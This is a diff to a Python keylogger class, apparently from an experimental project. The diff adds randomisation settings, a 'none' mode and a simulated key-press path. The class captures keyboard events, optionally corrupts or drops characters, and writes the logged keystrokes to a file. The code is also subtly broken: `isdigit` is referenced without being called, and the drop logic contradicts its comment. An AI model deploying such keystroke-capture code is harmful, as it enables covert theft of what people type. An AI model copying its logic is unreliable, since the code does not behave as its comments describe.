@@ -6,10 +6,24 @@ import random
 class Keylogger:
     mode = []
     logged = ""
+    rand = 10
+
+    def change_mode(self, change):
+        self.mode = change
+    
+    def change_rand(self, random):
+        self.rand = random  
+
+    def get_mode(self):
+        return self.mode
+
+    def get_rand(self):
+        return self.rand
 
     # Initialize mode from command lien
     def __init__(self, mode):
         self.mode = mode
+        self.rand = 10
 
     # Format output string so that it isn't one long line
     def create_output_string(self):
@@ -35,21 +49,24 @@ class Keylogger:
         return
 
     def simulated_key_pressed(self, key):
+        c = key
         # Random mode, each character has a 10% chance of being a random character, rather than the one pressed
         if self.mode == "random":
-            if random.randint(1, 10) == 1:
+            if random.randint(1, self.get_rand()) == 1:
                 # Creates random character from range of ascii values for standard keyboard operations
                 rand_char = chr(random.randint(32, 126))
                 self.logged += rand_char
+                c = rand_char
             # case where 90% chance of correct logging is hit
             else:
                 self.logged += key
+        elif self.mode == "none":
+            self.logged += key
         # If mode is a number then there is a 1/mode chance each character will be dropped
         elif self.mode.isdigit:
             if random.randint(1, int(self.mode)) == 1:
                 self.logged += key
-        else:
-            self.logged += key
+        return c
 
 
     # Handles different mode operations and adds appropriate character to log
@@ -63,12 +80,12 @@ class Keylogger:
             # case where 90% chance of correct logging is hit
             else:
                 self.logged += event.name
+        elif self.mode == "none":
+             self.logged += event.name
         # If mode is a number then there is a 1/mode chance each character will be dropped        
         elif self.mode.isdigit:
             if random.randint(1, int(self.mode)) == 1:
                 self.logged += event.name
-        else:
-            self.logged += event.name
         # Writes to file when you press "a"
         if event.name == "a":
             self.write()
@@ -85,7 +102,7 @@ if __name__ == '__main__':
     if len(sys.argv) > 1:
         mode = sys.argv[1]
     else:
-        mode = None
+        mode = "none"
     k1 = Keylogger(mode)
     k1.start()
     
